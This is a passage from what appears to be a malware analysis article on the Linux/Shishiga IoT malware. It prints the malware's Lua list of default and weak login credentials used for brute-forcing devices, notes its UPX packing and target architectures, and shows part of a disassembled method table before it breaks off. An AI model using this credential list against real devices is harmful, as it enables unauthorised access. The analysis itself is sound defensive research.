data-line="crayon-60581b86282d2614802930-60">60</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282d2614802930-1"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-2"><span class="crayon-e">local </span><span class="crayon-v">accounts</span><span class="crayon-o">=</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"admin"</span><span class="crayon-sy">,</span><span class="crayon-s">"admin"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"root"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"adm"</span><span class="crayon-sy">,</span><span class="crayon-s">"adm"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"ubnt"</span><span class="crayon-sy">,</span><span class="crayon-s">"ubnt"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"admin"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"adm"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"user"</span><span class="crayon-sy">,</span><span class="crayon-s">"user"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"pi"</span><span class="crayon-sy">,</span><span class="crayon-s">"pi"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-12"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-13">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-14"><span class="crayon-o">--</span><span class="crayon-sy">[</span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"acer"</span><span class="crayon-sy">,</span><span class="crayon-s">"acer"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"security"</span><span class="crayon-sy">,</span><span class="crayon-s">"security"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"toor"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"roottoor"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"password"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-20">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282d2614802930-21">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"test"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"abc123"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"111111"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"1q2w3e"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"oracle"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"1q2w3e4r"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"123123"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"qwe123"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"p@ssw0rd"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-31">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"1"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"12"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"123"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"1234"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"12346"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"123467"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"1234678"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"12346789"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"123467890"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"qwerty"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"pass"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"toor"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"roottoor"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"password123"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"password123456"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"pass123"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"password"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"passw0rd"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"1qaz"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"1qaz2wsx"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"asdfgh"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-53">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"user"</span><span class="crayon-sy">,</span><span class="crayon-s">"user"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-55"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"user"</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"acer"</span><span class="crayon-sy">,</span><span class="crayon-s">"acer"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"security"</span><span class="crayon-sy">,</span><span class="crayon-s">"security"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-s">"root"</span><span class="crayon-sy">,</span><span class="crayon-s">"passw0rds"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d2614802930-59"><span class="crayon-sy">]</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d2614802930-60"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->

</div>
<div class="listingblock">
<div class="content"></div>
</div>
<div class="paragraph">
<p>We found several binaries of Linux/Shishiga for various architectures such as MIPS (both big- and little-endian), ARM (armv4l), i686, and also PowerPC. These are common for IoT devices. We think that other architectures like SPARC, SH-4 or m68k could be supported as we will explain later.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_shishiga_s_skills">Shishiga’s skills</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Linux/Shishiga is a binary packed with <a href="https://upx.github.io" target="_blank" rel="noopener">UPX</a> 3.91 (Ultimate Packer for Executables), but the UPX tool will have trouble unpacking these binaries because Shishiga adds data at the end of the packed file.</p>
</div>
<div class="paragraph">
<p>After unpacking, we see that it’s <a href="https://en.wikipedia.org/wiki/Static_library" target="_blank" rel="noopener">statically linked</a> with the Lua runtime library and stripped of all symbols.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282d4867513440" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ file unpacked.i686.lm
unpacked.i686.lm: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),
statically linked, stripped</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282d4867513440-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d4867513440-2">2</div><div class="crayon-num" data-line="crayon-60581b86282d4867513440-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282d4867513440-1"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-e">file </span><span class="crayon-v">unpacked</span><span class="crayon-sy">.</span><span class="crayon-v">i686</span><span class="crayon-sy">.</span><span class="crayon-e">lm</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d4867513440-2"><span class="crayon-v">unpacked</span><span class="crayon-sy">.</span><span class="crayon-v">i686</span><span class="crayon-sy">.</span><span class="crayon-v">lm</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">ELF</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-o">-</span><span class="crayon-e">bit </span><span class="crayon-e">LSB </span><span class="crayon-v">executable</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">Intel</span><span class="crayon-h"> </span><span class="crayon-cn">80386</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">version</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">GNU</span><span class="crayon-o">/</span><span class="crayon-v">Linux</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282d4867513440-3"><span class="crayon-e">statically </span><span class="crayon-v">linked</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">stripped</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>
</div>
<div class="paragraph">
<p>Once executed, the binary will initialize the <code>malware</code> Lua module with the following methods:</p>
</div>
<div class="listingblock">
<div class="title">Malware methods</div>
<div class="content">
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282d5504961658" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
malware_module_methods  dd offset aGetver       ; "getver"
                        dd offset getver
                        dd offset aGetos        ; "getos"
                        dd offset getos
                        dd offset aGetarch      ; "getarch"
                        dd offset getarch
                        dd offset aGetmacaddr   ; "getmacaddr"
                        dd offset getmacaddr
                        dd offset aGetmods      ; "getmods"
                        dd offset getmods
                        dd offset aSetargs      ; "setargs"
                        dd offset setargs</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282d5504961658-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d5504961658-2">2</div><div class="crayon-num" data-line="crayon-60581b86282d5504961658-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d5504961658-4">4</div><div class="crayon-num" data-line="crayon-60581b86282d5504961658-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d5504961658-6">6</div><div class="crayon-num" data-line="crayon-60581b86282d5504961658-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d5504961658-8">8</div><div class="crayon-num" data-line="crayon-60581b86282d5504961658-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d5504961658-10">10</div><div class="crayon-num" data-line="crayon-60581b86282d5504961658-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282d5504961658-12">12</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282d5504961658-1"><span class="crayon-e">malware_module_methods&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-i">aGetver</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"getver"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d5504961658-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-e">getver</span></div><div class="crayon-line" id="crayon-60581b86282d5504961658-3"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-i">aGetos</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"getos"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d5504961658-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-e">getos</span></div><div class="crayon-line" id="crayon-60581b86282d5504961658-5"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-i">aGetarch</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"getarch"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d5504961658-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-e">getarch</span></div><div class="crayon-line" id="crayon-60581b86282d5504961658-7"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-i">aGetmacaddr</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"getmacaddr"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d5504961658-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-e">getmacaddr</span></div><div class="crayon-line" id="crayon-60581b86282d5504961658-9"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dd </span><span class="crayon-e">offset </span><span class="crayon-i">aGetmods</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"getmods"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282d5504961658-10"><span 